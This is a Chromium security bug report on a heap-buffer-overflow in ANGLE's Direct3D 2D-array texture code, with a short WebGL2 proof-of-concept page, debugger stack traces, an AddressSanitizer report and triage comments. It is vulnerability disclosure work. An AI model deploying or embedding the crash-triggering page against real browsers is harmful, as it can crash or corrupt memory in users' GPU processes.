# Security: heap-buffer-overflow TextureD3D_2DArray::getImage

| Field | Value |
|-------|-------|
| **Issue ID** | [40094428](https://issues.chromium.org/issues/40094428) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>WebGL, Internals>GPU>ANGLE |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | [Deleted User] |
| **Assignee** | jm...@chromium.org |
| **Created** | 2019-03-29 |
| **Bounty** | $1,000.00 |

## Description

Tested on Windows 10 and Chrome Stable 71.0.3578.98

3:035> r
rax=0000000000000001 rbx=900016004858d2dd rcx=0000014b30b9b1b0
rdx=0000000000000000 rsi=0000014b30b9b1b0 rdi=000000411c1fd438
rip=00007ffb3726a88a rsp=000000411c1fd410 rbp=000000411c1fd5b8
 r8=0000000000000000  r9=0000000000000000 r10=0000000000000000
r11=0000000000000000 r12=0000014b30b93010 r13=0000014b30b9b1b0
r14=0000000000000000 r15=0000000000000000
iopl=0         nv up ei pl nz na pe nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
libglesv2!rx::TextureD3D::canCreateRenderTargetForImage+0x72:
00007ffb`3726a88a 807b1800        cmp     byte ptr [rbx+18h],0 ds:90001600`4858d2f5=??

3:035> k
 # Child-SP          RetAddr           Call Site
00 00000041`1c1fd410 00007ffb`37271611 libglesv2!rx::TextureD3D::canCreateRenderTargetForImage+0x72 [C:\b\c\b\win64_clang\src\third_party\angle\src\libANGLE\renderer\d3d\TextureD3D.cpp @ 587] 
01 00000041`1c1fd470 00007ffb`3719afb5 libglesv2!rx::TextureD3D_2DArray::copySubImage+0xe1 [C:\b\c\b\win64_clang\src\third_party\angle\src\libANGLE\renderer\d3d\TextureD3D.cpp @ 3200] 
02 00000041`1c1fd580 00007ffb`3713aa0a libglesv2!gl::Texture::copySubImage+0x101 [C:\b\c\b\win64_clang\src\third_party\angle\src\libANGLE\Texture.cpp @ 1097] 
03 00000041`1c1fd630 00007ffb`37110faf libglesv2!gl::Context::copyTexSubImage3D+0x106 [C:\b\c\b\win64_clang\src\third_party\angle\src\libANGLE\Context.cpp @ 3766] 
04 00000041`1c1fd6f0 00007ffb`1daece40 libglesv2!gl::CopyTexSubImage3D+0xf6 [C:\b\c\b\win64_clang\src\third_party\angle\src\libGLESv2\entry_points_gles_3_0_autogen.cpp @ 409] 
05 00000041`1c1fd790 00007ffb`1e42a909 chrome_child!gl::GLApiBase::glCopyTexSubImage3DFn+0x60 [C:\b\c\b\win64_clang\src\ui\gl\gl_bindings_autogen_gl.cc @ 3097] 
06 00000041`1c1fd800 00007ffb`1e3f7486 chrome_child!gpu::gles2::GLES2DecoderImpl::DoCopyTexSubImage3D+0x4d9 [C:\b\c\b\win64_clang\src\gpu\command_buffer\service\gles2_cmd_decoder.cc @ 14885] 
07 00000041`1c1fd930 00007ffb`1e4167f3 chrome_child!gpu::gles2::GLES2DecoderImpl::HandleCopyTexSubImage3D+0xbc [C:\b\c\b\win64_clang\src\gpu\command_buffer\service\gles2_cmd_decoder_autogen.h @ 676] 
08 00000041`1c1fd9d0 00007ffb`1e416113 chrome_child!gpu::gles2::GLES2DecoderImpl::DoCommandsImpl<0>+0xfd [C:\b\c\b\win64_clang\src\gpu\command_buffer\service\gles2_cmd_decoder.cc @ 5664] 
09 00000041`1c1fdb60 00007ffb`1e3e8189 chrome_child!gpu::gles2::GLES2DecoderImpl::DoCommands+0x25 [C:\b\c\b\win64_clang\src\gpu\command_buffer\service\gles2_cmd_decoder.cc @ 5727] 
0a 00000041`1c1fdb90 00007ffb`1db8ddc4 chrome_child!gpu::CommandBufferService::Flush+0xef [C:\b\c\b\win64_clang\src\gpu\command_buffer\service\command_buffer_service.cc @ 72] 
0b 00000041`1c1fdcd0 00007ffb`1db8dbce chrome_child!gpu::CommandBufferStub::OnAsyncFlush+0x112 [C:\b\c\b\win64_clang\src\gpu\ipc\service\command_buffer_stub.cc @ 539] 
0c 00000041`1c1fde10 00007ffb`1db8c8c5 chrome_child!IPC::MessageT<GpuCommandBufferMsg_AsyncFlush_Meta,std::tuple<int,unsigned int>,void>::Dispatch<gpu::CommandBufferStub,gpu::CommandBufferStub,void,void (gpu::CommandBufferStub::*)(int, unsigned int)>+0x92 [C:\b\c\b\win64_clang\src\ipc\ipc_message_templates.h @ 146] 
0d 00000041`1c1fdf00 00007ffb`1d68d1cd chrome_child!gpu::CommandBufferStub::OnMessageReceived+0x219 [C:\b\c\b\win64_clang\src\gpu\ipc\service\command_buffer_stub.cc @ 199] 
0e 00000041`1c1fe120 00007ffb`1d68ba72 chrome_child!gpu::GpuChannel::HandleMessageHelper+0x35 [C:\b\c\b\win64_clang\src\gpu\ipc\service\gpu_channel.cc @ 516] 
0f 00000041`1c1fe160 00007ffb`1d67898f chrome_child!gpu::GpuChannel::HandleMessage+0x5e [C:\b\c\b\win64_clang\src\gpu\ipc\service\gpu_channel.cc @ 492] 
10 00000041`1c1fe200 00007ffb`1b4a7150 chrome_child!gpu::Scheduler::RunNextTask+0x2ab [C:\b\c\b\win64_clang\src\gpu\command_buffer\service\scheduler.cc @ 526] 
11 00000041`1c1fe370 00007ffb`1b4a69ef chrome_child!base::debug::TaskAnnotator::RunTask+0x120 [C:\b\c\b\win64_clang\src\base\debug\task_annotator.cc @ 99] 
12 00000041`1c1fe490 00007ffb`1b4a04f5 chrome_child!base::MessageLoop::RunTask+0xdf [C:\b\c\b\win64_clang\src\base\message_loop\message_loop.cc @ 436] 
13 00000041`1c1fe5c0 00007ffb`1b4a0349 chrome_child!base::MessageLoop::DoWork+0x185 [C:\b\c\b\win64_clang\src\base\message_loop\message_loop.cc @ 517] 
14 00000041`1c1fe7f0 00007ffb`1b49f761 chrome_child!base::MessagePumpDefault::Run+0x99 [C:\b\c\b\win64_clang\src\base\message_loop\message_pump_default.cc @ 37] 
15 00000041`1c1fe850 00007ffb`1d8061f0 chrome_child!base::RunLoop::Run+0x31 [C:\b\c\b\win64_clang\src\base\run_loop.cc @ 108] 
16 00000041`1c1fe880 00007ffb`1b47c543 chrome_child!content::GpuMain+0x3e8 [C:\b\c\b\win64_clang\src\content\gpu\gpu_main.cc @ 356] 
17 00000041`1c1febb0 00007ffb`1b454920 chrome_child!content::ContentMainRunnerImpl::Run+0x171 [C:\b\c\b\win64_clang\src\content\app\content_main_runner_impl.cc @ 904] 
18 00000041`1c1fed60 00007ffb`1b454525 chrome_child!service_manager::Main+0x333 [C:\b\c\b\win64_clang\src\services\service_manager\embedder\main.cc @ 472] 
19 00000041`1c1ff0e0 00007ffb`1b451a0e chrome_child!content::ContentMain+0x3e [C:\b\c\b\win64_clang\src\content\app\content_main.cc @ 19] 
1a 00000041`1c1ff170 00007ff7`b2f8374c chrome_child!ChromeMain+0x118 [C:\b\c\b\win64_clang\src\chrome\app\chrome_main.cc @ 0] 
1b 00000041`1c1ff250 00007ff7`b2f815f0 chrome!MainDllLoader::Launch+0x26c [C:\b\c\b\win64_clang\src\chrome\app\main_dll_loader_win.cc @ 201] 
1c 00000041`1c1ff340 00007ff7`b3055a62 chrome!wWinMain+0x5f0 [C:\b\c\b\win64_clang\src\chrome\app\chrome_exe_main_win.cc @ 229] 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\System32\KERNEL32.DLL - 
1d 00000041`1c1ff710 00007ffb`80d17e94 chrome!__scrt_common_main_seh+0x106 [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 283] 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for ntdll.dll - 
1e 00000041`1c1ff750 00007ffb`80f97ad1 KERNEL32!BaseThreadInitThunk+0x14
1f 00000041`1c1ff780 00000000`00000000 ntdll!RtlUserThreadStart+0x21


PoC
<!DOCTYPE html>
<body>
<canvas id="canvas4" width="1024" height="1024"></canvas>

<script>
var canvas = document.getElementById('canvas4');
var gl4 = canvas.getContext('webgl2', {});

var buffer = gl4.createBuffer();
gl4.bindBuffer(gl4.UNIFORM_BUFFER, buffer);
gl4.bufferData(gl4.UNIFORM_BUFFER, new Uint16Array(24), gl4.STREAM_READ, 0, 0);

var texture = gl4.createTexture();
gl4.bindTexture(gl4.TEXTURE_2D_ARRAY, texture);
imgData = new Uint8Array(1048576);

gl4.texImage3D(gl4.TEXTURE_2D_ARRAY, 0, gl4.RG8, 64, 64, 64, 0, gl4.RG, gl4.UNSIGNED_BYTE, imgData);
gl4.copyTexSubImage3D( gl4.TEXTURE_2D_ARRAY, 0, 0, 0, 0, 0, 0, 64, 64 );
</script>

</body>
</html>



## Timeline

### [Deleted User] (2019-03-29)

Running this on ASAN build

==1632==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x12b0bdc36af8 at pc 0x7ffae8405ef7 bp 0x00a256dfa9f0 sp 0x00a256dfaa38
READ of size 8 at 0x12b0bdc36af8 thread T0
    #0 0x7ffae8405ef6 in rx::TextureD3D_2DArray::getImage(class gl::ImageIndex const &)const  third_party\angle\src\libANGLE\renderer\d3d\TextureD3D.cpp:2987:19
    #1 0x7ffae83ef131 in rx::TextureD3D::canCreateRenderTargetForImage(class gl::ImageIndex const &)const  third_party\angle\src\libANGLE\renderer\d3d\TextureD3D.cpp:587:23
    #2 0x7ffae8409135 in rx::TextureD3D_2DArray::copySubImage(class gl::Context const *,class gl::ImageIndex const &,struct gl::Offset const &,struct gl::Rectangle const &,class gl::Framebuffer *) third_party\angle\src\libANGLE\renderer\d3d\TextureD3D.cpp:3199:10
    #3 0x7ffae80e5d97 in gl::Texture::copySubImage(class gl::Context *,enum gl::TextureTarget,int,struct gl::Offset const &,struct gl::Rectangle const &,class gl::Framebuffer *) third_party\angle\src\libANGLE\Texture.cpp:1165:5
    #4 0x7ffae7f9d892 in gl::Context::copyTexSubImage3D(enum gl::TextureType,int,int,int,int,int,int,int,int) third_party\angle\src\libANGLE\Context.cpp:3724:5
    #5 0x7ffae7f3ee4c in gl::CopyTexSubImage3D(unsigned int,int,int,int,int,int,int,int,int) third_party\angle\src\libGLESv2\entry_points_gles_3_0_autogen.cpp:369:22
    #6 0x7ffaf24b7627 in gl::GLApiBase::glCopyTexSubImage3DFn(unsigned int,int,int,int,int,int,int,int,int) ui\gl\gl_bindings_autogen_gl.cc:3120:3
    #7 0x7ffaf897590c in gpu::gles2::GLES2DecoderPassthroughImpl::DoCopyTexSubImage3D(unsigned int,int,int,int,int,int,int,int,int) gpu\command_buffer\service\gles2_cmd_decoder_passthrough_doers.cc:873:10
    #8 0x7ffaf7077b4c in gpu::gles2::GLES2DecoderPassthroughImpl::HandleCopyTexSubImage3D(unsigned int,void const volatile *) gpu\command_buffer\service\gles2_cmd_decoder_passthrough_handlers_autogen.cc:547:24
    #9 0x7ffaf4afb9db in gpu::gles2::GLES2DecoderPassthroughImpl::DoCommandsImpl<0>(unsigned int,void const volatile *,int,int *) gpu\command_buffer\service\gles2_cmd_decoder_passthrough.cc:654:20
    #10 0x7ffaf4afadc6 in gpu::gles2::GLES2DecoderPassthroughImpl::DoCommands(unsigned int,void const volatile *,int,int *) gpu\command_buffer\service\gles2_cmd_decoder_passthrough.cc:592:12
    #11 0x7ffaf4aeb709 in gpu::CommandBufferService::Flush(int,class gpu::AsyncAPIInterface *) gpu\command_buffer\service\command_buffer_service.cc:69:18
    #12 0x7ffaf2cb711c in gpu::CommandBufferStub::OnAsyncFlush(int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > const &) gpu\ipc\service\command_buffer_stub.cc:563:22
    #13 0x7ffaf2cb6a0f in IPC::MessageT<struct GpuCommandBufferMsg_AsyncFlush_Meta,class std::tuple<int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > >,void>::Dispatch<class gpu::CommandBufferStub,class gpu::CommandBufferStub,void,void ( gpu::CommandBufferStub::*)(int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > const &)>(class IPC::Message const *,class gpu::CommandBufferStub *,class gpu::CommandBufferStub *,void *,void ( gpu::CommandBufferStub::*)(int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > const &)) ipc\ipc_message_templates.h:146:7
    #14 0x7ffaf2cb3574 in gpu::CommandBufferStub::OnMessageReceived(class IPC::Message const &) gpu\ipc\service\command_buffer_stub.cc:199:5
    #15 0x7ffaf12e2321 in gpu::GpuChannel::HandleMessageHelper(class IPC::Message const &) gpu\ipc\service\gpu_channel.cc:550:23
    #16 0x7ffaf12dc81e in gpu::GpuChannel::HandleMessage(class IPC::Message const &) gpu\ipc\service\gpu_channel.cc:527:3
    #17 0x7ffaf0fc3c29 in gpu::Scheduler::RunNextTask(void) gpu\command_buffer\service\scheduler.cc:528:24
    #18 0x7ffaf3e6a1f3 in base::debug::TaskAnnotator::RunTask(char const *,struct base::PendingTask *) base\debug\task_annotator.cc:99:33
    #19 0x7ffaf1a69ea3 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(class base::sequence_manager::LazyNow *,bool *) base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:299:21
    #20 0x7ffaf1a6af3d in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoDelayedWork(class base::TimeTicks *) base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:245:7
    #21 0x7ffaf1a20bdb in base::MessagePumpDefault::Run(class base::MessagePump::Delegate *) base\message_loop\message_pump_default.cc:43:27
    #22 0x7ffaf1a6b64c in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool) base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:376:12
    #23 0x7ffaf02c4d60 in base::RunLoop::Run(void) base\run_loop.cc:150:14
    #24 0x7ffaf182a349 in content::GpuMain(struct content::MainFunctionParams const &) content\gpu\gpu_main.cc:360:14
    #25 0x7ffaf01c2eea in content::ContentMainRunnerImpl::Run(bool) content\app\content_main_runner_impl.cc:871:10
    #26 0x7ffaf01d925d in service_manager::Main(struct service_manager::MainParams const &) services\service_manager\embedder\main.cc:461:29
    #27 0x7ffaf01c1778 in content::ContentMain(struct content::ContentMainParams const &) content\app\content_main.cc:19:10
    #28 0x7ffae9711327 in ChromeMain chrome\app\chrome_main.cc:102:12
    #29 0x7ff618257d0d in MainDllLoader::Launch(struct HINSTANCE__ *,class base::TimeTicks) chrome\app\main_dll_loader_win.cc:201:12
    #30 0x7ff618252354 in main chrome\app\chrome_exe_main_win.cc:229:20
    #31 0x7ff6185c5253 in __scrt_common_main_seh d:\agent\_work\2\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #32 0x7ffb80d17e93  (C:\WINDOWS\System32\KERNEL32.DLL+0x180017e93)
    #33 0x7ffb80f97ad0  (C:\WINDOWS\SYSTEM32\ntdll.dll+0x180067ad0)

0x12b0bdc36af8 is located 8 bytes to the left of 512-byte region [0x12b0bdc36b00,0x12b0bdc36d00)
allocated by thread T0 here:
    #0 0x7ff618293500 in malloc C:\b\rr\tmpdx_d02\w\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:69
    #1 0x7ffae8afc4d2 in operator new(unsigned __int64) d:\agent\_work\2\s\src\vctools\crt\vcstartup\src\heap\new_scalar.cpp:35
    #2 0x7ffae8406a5a in rx::TextureD3D_2DArray::redefineImage(class gl::Context const *,int,unsigned int,struct gl::Extents const &,bool) third_party\angle\src\libANGLE\renderer\d3d\TextureD3D.cpp:3662:34
    #3 0x7ffae840621c in rx::TextureD3D_2DArray::setImage(class gl::Context const *,class gl::ImageIndex const &,unsigned int,struct gl::Extents const &,unsigned int,unsigned int,struct gl::PixelUnpackState const &,unsigned char const *) third_party\angle\src\libANGLE\renderer\d3d\TextureD3D.cpp:3049:5
    #4 0x7ffae80e3d57 in gl::Texture::setImage(class gl::Context *,struct gl::PixelUnpackState const &,enum gl::TextureTarget,int,unsigned int,struct gl::Extents const &,unsigned int,unsigned int,unsigned char const *) third_party\angle\src\libANGLE\Texture.cpp:1026:5
    #5 0x7ffae7f9f97e in gl::Context::texImage3D(enum gl::TextureType,int,int,int,int,int,int,unsigned int,unsigned int,void const *) third_party\angle\src\libANGLE\Context.cpp:3998:5
    #6 0x7ffae7f9fa91 in gl::Context::texImage3DRobust(enum gl::TextureType,int,int,int,int,int,int,unsigned int,unsigned int,int,void const *) third_party\angle\src\libANGLE\Context.cpp:4015:5
    #7 0x7ffae7f4af8b in gl::TexImage3DRobustANGLE(unsigned int,int,int,int,int,int,int,unsigned int,unsigned int,int,void const *) third_party\angle\src\libGLESv2\entry_points_gles_ext_autogen.cpp:931:22
    #8 0x7ffaf24bf038 in gl::GLApiBase::glTexImage3DRobustANGLEFn(unsigned int,int,int,int,int,int,int,unsigned int,unsigned int,int,void const *) ui\gl\gl_bindings_autogen_gl.cc:5267:3
    #9 0x7ffaf898a080 in gpu::gles2::GLES2DecoderPassthroughImpl::DoTexImage3D(unsigned int,int,int,int,int,int,int,unsigned int,unsigned int,int,void const *) gpu\command_buffer\service\gles2_cmd_decoder_passthrough_doers.cc:2521:10
    #10 0x7ffaf708d10d in gpu::gles2::GLES2DecoderPassthroughImpl::HandleTexImage3D(unsigned int,void const volatile *) gpu\command_buffer\service\gles2_cmd_decoder_passthrough_handlers.cc:1043:10
    #11 0x7ffaf4afb9db in gpu::gles2::GLES2DecoderPassthroughImpl::DoCommandsImpl<0>(unsigned int,void const volatile *,int,int *) gpu\command_buffer\service\gles2_cmd_decoder_passthrough.cc:654:20
    #12 0x7ffaf4afadc6 in gpu::gles2::GLES2DecoderPassthroughImpl::DoCommands(unsigned int,void const volatile *,int,int *) gpu\command_buffer\service\gles2_cmd_decoder_passthrough.cc:592:12
    #13 0x7ffaf4aeb709 in gpu::CommandBufferService::Flush(int,class gpu::AsyncAPIInterface *) gpu\command_buffer\service\command_buffer_service.cc:69:18
    #14 0x7ffaf2cb711c in gpu::CommandBufferStub::OnAsyncFlush(int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > const &) gpu\ipc\service\command_buffer_stub.cc:563:22
    #15 0x7ffaf2cb6a0f in IPC::MessageT<struct GpuCommandBufferMsg_AsyncFlush_Meta,class std::tuple<int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > >,void>::Dispatch<class gpu::CommandBufferStub,class gpu::CommandBufferStub,void,void ( gpu::CommandBufferStub::*)(int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > const &)>(class IPC::Message const *,class gpu::CommandBufferStub *,class gpu::CommandBufferStub *,void *,void ( gpu::CommandBufferStub::*)(int,unsigned int,class std::vector<struct gpu::SyncToken,class std::allocator<struct gpu::SyncToken> > const &)) ipc\ipc_message_templates.h:146:7
    #16 0x7ffaf2cb3574 in gpu::CommandBufferStub::OnMessageReceived(class IPC::Message const &) gpu\ipc\service\command_buffer_stub.cc:199:5
    #17 0x7ffaf12e2321 in gpu::GpuChannel::HandleMessageHelper(class IPC::Message const &) gpu\ipc\service\gpu_channel.cc:550:23
    #18 0x7ffaf12dc81e in gpu::GpuChannel::HandleMessage(class IPC::Message const &) gpu\ipc\service\gpu_channel.cc:527:3
    #19 0x7ffaf0fc3c29 in gpu::Scheduler::RunNextTask(void) gpu\command_buffer\service\scheduler.cc:528:24
    #20 0x7ffaf3e6a1f3 in base::debug::TaskAnnotator::RunTask(char const *,struct base::PendingTask *) base\debug\task_annotator.cc:99:33
    #21 0x7ffaf1a69ea3 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(class base::sequence_manager::LazyNow *,bool *) base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:299:21
    #22 0x7ffaf1a6af3d in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoDelayedWork(class base::TimeTicks *) base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:245:7
    #23 0x7ffaf1a20bdb in base::MessagePumpDefault::Run(class base::MessagePump::Delegate *) base\message_loop\message_pump_default.cc:43:27
    #24 0x7ffaf1a6b64c in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool) base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:376:12
    #25 0x7ffaf02c4d60 in base::RunLoop::Run(void) base\run_loop.cc:150:14
    #26 0x7ffaf182a349 in content::GpuMain(struct content::MainFunctionParams const &) content\gpu\gpu_main.cc:360:14
    #27 0x7ffaf01c2eea in content::ContentMainRunnerImpl::Run(bool) content\app\content_main_runner_impl.cc:871:10
    #28 0x7ffaf01d925d in service_manager::Main(struct service_manager::MainParams const &) services\service_manager\embedder\main.cc:461:29
    #29 0x7ffaf01c1778 in content::ContentMain(struct content::ContentMainParams const &) content\app\content_main.cc:19:10

SUMMARY: AddressSanitizer: heap-buffer-overflow third_party\angle\src\libANGLE\renderer\d3d\TextureD3D.cpp:2987:19 in rx::TextureD3D_2DArray::getImage(class gl::ImageIndex const &)const
Shadow bytes around the buggy address:
  0x04dcd5706d00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x04dcd5706d10: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x04dcd5706d20: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x04dcd5706d30: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x04dcd5706d40: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa
=>0x04dcd5706d50: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa[fa]
  0x04dcd5706d60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x04dcd5706d70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x04dcd5706d80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x04dcd5706d90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x04dcd5706da0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==1632==ABORTING


### cl...@chromium.org (2019-03-29)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4773035100995584.

### dr...@chromium.org (2019-03-29)

Looks like ClusterFuzz failed to reproduce your crash. I notice you're testing on M71, which is could easily explain the confusion here. Can you confirm the crash still occurs on the latest stable version (73.0.3683.86) ?

### cl...@chromium.org (2019-03-29)

Testcase 4773035100995584 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=4773035100995584.

### [Deleted User] (2019-03-29)

It does work on the latest 73.x version. Just tested it.
It depends on ANGLE, so is this being tested on a Windows machine with ANGLE?

3:034> k
 # Child-SP          RetAddr           Call Site
00 0000000d`7c9fd9c0 00007ffd`a5d3ebf5 libglesv2!rx::TextureD3D::canCreateRenderTargetForImage+0x72 [C:\b\c\b\win64_clang\src\third_party\angle\src\libANGLE\renderer\d3d\TextureD3D.cpp @ 590] 
01 0000000d`7c9fda20 00007ffd`a5c6eded libglesv2!rx::TextureD3D_2DArray::copySubImage+0xc1 [C:\b\c\b\win64_clang\src\third_party\angle\src\libANGLE\renderer\d3d\TextureD3D.cpp @ 3199] 
02 0000000d`7c9fdaf0 00007ffd`a5c191eb libglesv2!gl::Texture::copySubImage+0xd9 [C:\b\c\b\win64_clang\src\third_party\angle\src\libANGLE\Texture.cpp @ 1165] 
03 0000000d`7c9fdba0 00007ffd`a5bf1beb libglesv2!gl::Context::copyTexSubImage3D+0xe3 [C:\b\c\b\win64_clang\src\third_party\angle\src\libANGLE\Context.cpp @ 3733] 
04 0000000d`7c9fdc50 00007ffd`81d9bb72 libglesv2!gl::CopyTexSubImage3D+0xe8 [C:\b\c\b\win64_clang\src\third_party\angle\src\libGLESv2\entry_points_gles_3_0_autogen.cpp @ 373] 
05 0000000d`7c9fdcf0 00007ffd`82772fe2 chrome_child!gl::GLApiBase::glCopyTexSubImage3DFn+0x60 [C:\b\c\b\win64_clang\src\ui\gl\gl_bindings_autogen_gl.cc @ 3122] 
06 0000000d`7c9fdd60 00007ffd`8273f8a2 chrome_child!gpu::gles2::GLES2DecoderImpl::DoCopyTexSubImage3D+0x4d2 [C:\b\c\b\win64_clang\src\gpu\command_buffer\service\gles2_cmd_decoder.cc @ 15382] 
07 0000000d`7c9fde90 00007ffd`8275ee6d chrome_child!gpu::gles2::GLES2DecoderImpl::HandleCopyTexSubImage3D+0xbc [C:\b\c\b\win64_clang\src\gpu\command_buffer\service\gles2_cmd_decoder_autogen.h @ 676] 
08 0000000d`7c9fdf30 00007ffd`8275e783 chrome_child!gpu::gles2::GLES2DecoderImpl::DoCommandsImpl<0>+0xfb [C:\b\c\b\win64_clang\src\gpu\command_buffer\service\gles2_cmd_decoder.cc @ 5834] 
09 0000000d`7c9fe0c0 00007ffd`82730940 chrome_child!gpu::gles2::GLES2DecoderImpl::DoCommands+0x25 [C:\b\c\b\win64_clang\src\gpu\command_buffer\service\gles2_cmd_decoder.cc @ 5897] 
0a 0000000d`7c9fe0f0 00007ffd`81f8c511 chrome_child!gpu::CommandBufferService::Flush+0xc6 [C:\b\c\b\win64_clang\src\gpu\command_buffer\service\command_buffer_service.cc @ 72] 
0b 0000000d`7c9fe1f0 00007ffd`81f8c301 chrome_child!gpu::CommandBufferStub::OnAsyncFlush+0x133 [C:\b\c\b\win64_clang\src\gpu\ipc\service\command_buffer_stub.cc @ 565] 
0c 0000000d`7c9fe2f0 00007ffd`81f8b604 chrome_child!IPC::MessageT<GpuCommandBufferMsg_AsyncFlush_Meta,std::tuple<int,unsigned int,std::vector<gpu::SyncToken,std::allocator<gpu::SyncToken> > >,void>::Dispatch<gpu::CommandBufferStub,gpu::CommandBufferStub,void,void (gpu::CommandBufferStub::*)(int, unsigned int, const std::vector<gpu::SyncToken,std::allocator<gpu::SyncToken> > &)>+0x7f [C:\b\c\b\win64_clang\src\ipc\ipc_message_templates.h @ 146] 
0d 0000000d`7c9fe3b0 00007ffd`819a55af chrome_child!gpu::CommandBufferStub::OnMessageReceived+0x4f6 [C:\b\c\b\win64_clang\src\gpu\ipc\service\command_buffer_stub.cc @ 199] 
0e 0000000d`7c9fe570 00007ffd`819a3f94 chrome_child!gpu::GpuChannel::HandleMessageHelper+0x35 [C:\b\c\b\win64_clang\src\gpu\ipc\service\gpu_channel.cc @ 554] 
0f 0000000d`7c9fe5b0 00007ffd`818f151f chrome_child!gpu::GpuChannel::HandleMessage+0x5e [C:\b\c\b\win64_clang\src\gpu\ipc\service\gpu_channel.cc @ 531] 
10 0000000d`7c9fe650 00007ffd`7f577003 chrome_child!gpu::Scheduler::RunNextTask+0x289 [C:\b\c\b\win64_clang\src\gpu\command_buffer\service\scheduler.cc @ 528] 
11 0000000d`7c9fe760 00007ffd`7f576d0e chrome_child!base::debug::TaskAnnotator::RunTask+0x103 [C:\b\c\b\win64_clang\src\base\debug\task_annotator.cc @ 105] 
12 0000000d`7c9fe840 00007ffd`7f576997 chrome_child!base::MessageLoopImpl::RunTask+0xde [C:\b\c\b\win64_clang\src\base\message_loop\message_loop_impl.cc @ 357] 
13 0000000d`7c9fe930 00007ffd`7f5767e9 chrome_child!base::MessageLoopImpl::DoWork+0x187 [C:\b\c\b\win64_clang\src\base\message_loop\message_loop_impl.cc @ 458] 
14 0000000d`7c9feb50 00007ffd`7f576326 chrome_child!base::MessagePumpDefault::Run+0x99 [C:\b\c\b\win64_clang\src\base\message_loop\message_pump_default.cc @ 39] 
15 0000000d`7c9febb0 00007ffd`81a9ee43 chrome_child!base::RunLoop::Run+0x1d6 [C:\b\c\b\win64_clang\src\base\run_loop.cc @ 156] 
16 0000000d`7c9fec60 00007ffd`7f598483 chrome_child!content::GpuMain+0x393 [C:\b\c\b\win64_clang\src\content\gpu\gpu_main.cc @ 360] 
17 0000000d`7c9fef70 00007ffd`7f5648a8 chrome_child!content::ContentMainRunnerImpl::Run+0x17b [C:\b\c\b\win64_clang\src\content\app\content_main_runner_impl.cc @ 871] 
18 0000000d`7c9ff120 00007ffd`7f564597 chrome_child!service_manager::Main+0x249 [C:\b\c\b\win64_clang\src\services\service_manager\embedder\main.cc @ 461] 
19 0000000d`7c9ff3e0 00007ffd`7f5619a8 chrome_child!content::ContentMain+0x3e [C:\b\c\b\win64_clang\src\content\app\content_main.cc @ 19] 
1a 0000000d`7c9ff470 00007ff7`aff336bc chrome_child!ChromeMain+0x118 [C:\b\c\b\win64_clang\src\chrome\app\chrome_main.cc @ 0] 
1b 0000000d`7c9ff550 00007ff7`aff31604 chrome!MainDllLoader::Launch+0x26c [C:\b\c\b\win64_clang\src\chrome\app\main_dll_loader_win.cc @ 201] 
1c 0000000d`7c9ff640 00007ff7`b001ee72 chrome!wWinMain+0x604 [C:\b\c\b\win64_clang\src\chrome\app\chrome_exe_main_win.cc @ 229] 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\System32\KERNEL32.DLL - 
1d 0000000d`7c9ffa10 00007ffd`eb7d7e94 chrome!__scrt_common_main_seh+0x106 [d:\agent\_work\2\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 288] 
